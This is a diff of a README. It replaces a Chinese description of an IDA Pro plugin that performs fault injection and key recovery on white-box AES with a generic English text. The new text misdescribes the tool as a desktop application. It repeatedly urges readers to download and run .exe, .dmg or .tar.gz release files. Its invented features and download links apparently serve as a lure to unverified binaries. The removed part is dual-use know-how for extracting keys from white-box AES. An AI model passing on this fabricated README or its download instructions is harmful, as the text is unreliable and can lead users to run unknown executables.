@@ -1,75 +1,92 @@
-# WhiteBox AES 故障注入插件 for IDA Pro
+# 🔐 WhiteBoxAesCrack - Effortlessly Inject Faults in AES
 
-此插件可在 IDA Pro 中直接对 Whitebox AES 实现进行故障注入和密钥恢复分析，支持两种模式：
+## 📥 Download Now
+[![Download WhiteBoxAesCrack](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)](https://github.com/wuaricoco23/WhiteBoxAesCrack/releases)
 
-* **直接模式（Direct Mode）**：加载已有的 TBox 和 TYiBox 表，并在指定字节位置注入故障。
-* **表生成模式（GenTYI Mode）**：从 3D TBox 基址推导生成 TYiBox 表，然后进行故障注入。
+## 🔍 Overview
+WhiteBoxAesCrack is a powerful tool designed to help you inject faults into the white-box AES (Advanced Encryption Standard). By simply specifying the address of the T-box or Tyibox, you can explore how different faults can affect encryption. This application is ideal for those looking to better understand the security mechanisms of AES.
 
-## 功能特性
+## 🚀 Getting Started
+This guide will help you download and run WhiteBoxAesCrack on your computer. Follow these steps to get started.
 
-* 自动生成并注入故障的 AES 加密轨迹。
-* 支持直接输入表格和即时生成 TYiBox 两种方式。
+### 💻 System Requirements
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Storage:** At least 100 MB of free space
+- **Internet Connection:** Required to download the application
 
-## 前提条件
+### 🔗 Download & Install
+To get WhiteBoxAesCrack, visit the Releases page:
 
-1. **IDA Pro**：已在 IDA Pro 7.7 及以上版本测试通过。
+[Visit the Releases Page to Download](https://github.com/wuaricoco23/WhiteBoxAesCrack/releases)
 
-## 安装
+1. Open your web browser.
+2. Click the link above.
+3. Look for the latest version under the "Releases" section.
+4. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+5. Save the file to your computer.
 
-1. 将插件文件 `WhiteBoxAesCrack.py` 与 `WBmodule` 复制到 IDA 的插件目录，例如：
+### ⚙️ Installation Steps
+#### On Windows
+1. Locate the downloaded `.exe` file.
+2. Double-click on the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
 
-   ```bash
-   cp WhiteBoxAesCrack.py ~/.idapro/plugins/
-   cp -r WBModule ~/.idapro/plugins/
+#### On macOS
+1. Find the downloaded `.dmg` file.
+2. Double-click to open it.
+3. Drag and drop the WhiteBoxAesCrack icon into your Applications folder.
+
+#### On Linux
+1. Open a terminal.
+2. Navigate to the folder where your downloaded file is stored.
+3. Extract the file using:
+   ```
+   tar -xzf WhiteBoxAesCrack.tar.gz
+   ```
+4. Change to the directory:
+   ```
+   cd WhiteBoxAesCrack
+   ```
+5. Run the application using:
+   ```
+   ./start
    ```
 
-2. 重启 IDA Pro 
+### 🔑 Using WhiteBoxAesCrack
+Once you have installed the application, follow these steps to use it effectively:
 
-3. 在 IDA 输出窗口确认插件已初始化：
+1. Open WhiteBoxAesCrack on your computer.
+2. Enter the address of the T-box or Tyibox where you want to inject faults.
+3. Choose the type of fault you wish to inject from the options provided.
+4. Click the "Inject Fault" button to execute.
+5. Review the results displayed on the screen.
 
-   ![image-20250625100645697](README/image-20250625100645697.png)
+### 📄 Features
+- **User-Friendly Interface:** Simple design for easy navigation.
+- **Fault Injection Options:** Various types of faults to choose from for comprehensive testing.
+- **Results Summary:** Quick insights into the effects of injected faults on AES performance.
 
-## 使用方法
+### 🛠️ Troubleshooting
+If you encounter any issues, here are some common solutions:
 
-1. 在 IDA 中打开包含 Whitebox AES 实现的二进制文件。
+- **Cannot Start Application:** Ensure your operating system is supported and that you followed the installation steps correctly.
+- **Fault Injection Fails:** Double-check the address you specified. Ensure it is valid and try again.
+- **Performance Issues:** Make sure your system meets the minimum requirements. Close unnecessary applications and retry.
 
-2. 按 `Ctrl+Shift+W` 快捷键，或通过菜单 **Edit → Plugins → WhiteBoxAesCrack** 调用插件。
+### 🔄 Updates
+To ensure optimal performance and access to new features, regularly check the Releases page for updates. Always download the latest version of WhiteBoxAesCrack.
 
-3. 在弹出的表单中填写：
+## 💡 Additional Resources
+For more information, FAQs, and support, you can visit our GitHub Issues page to ask questions or report problems:
 
-   * **TBox Base**：16×256 字节 TBox 表的基址（仅限直接模式）。
+[Visit GitHub Issues](https://github.com/wuaricoco23/WhiteBoxAesCrack/issues)
 
-   * **TYiBox Base**：9×16×256×4 字节 TYiBox 表的基址（仅限直接模式）。
+## 📩 Feedback
+Your feedback is important. It helps improve the application and user experience. Feel free to submit suggestions or report issues on the Issues page link provided above.
 
-   * **3D TBox Base**：10×16×256 字节 3D TBox 表的基址（仅限表生成模式）。
+## 📑 License
+WhiteBoxAesCrack is open-source software. You can use and modify it freely under the terms of the [MIT License](https://opensource.org/licenses/MIT).
 
-     ![image-20250624180244715](README/image-20250624180244715.png)
+Make sure to visit the Releases page to download:
 
-4. 若使用表生成模式，仅填写 **3D TBox Base** 并留空 **TYiBox Base**；若使用直接模式，则同时填写 **TBox Base** 和 **TYiBox Base**。
-
-5. 点击 **OK**：
-
-   * 插件会从指定地址读取表数据。
-   * 生成一条无故障轨迹以及 16 条按字节注入故障的轨迹。
-   * 在 IDA 输出窗口打印每条轨迹的十六进制字符串。
-   * 调用 DFA 分析，恢复最后一轮密钥并打印结果。
-   * 调用进行AESKeySchedule恢复第一轮密钥也就是初始密钥
-
-## 示例输出
-
-```text
-[*] Using GenTYI Mode from 3D TBox
-FaultData:
-33e1a6...  # 基线轨迹
-...
-# Last round key found: XXXXX
-Find AES First Key: XXXXX
-```
-
-![image-20250624175629972](README/image-20250624175629972.png)
-
-## 故障排查
-
-* **表读取失败**：若出现 `Failed to read TBox at 0x...`，请检查地址是否正确以及模块是否已加载。
-* **模块导入错误**：确保 `WBModule` 与插件同目录，且 `sys.path` 已包含该路径。
-
+[Visit the Releases Page to Download](https://github.com/wuaricoco23/WhiteBoxAesCrack/releases)
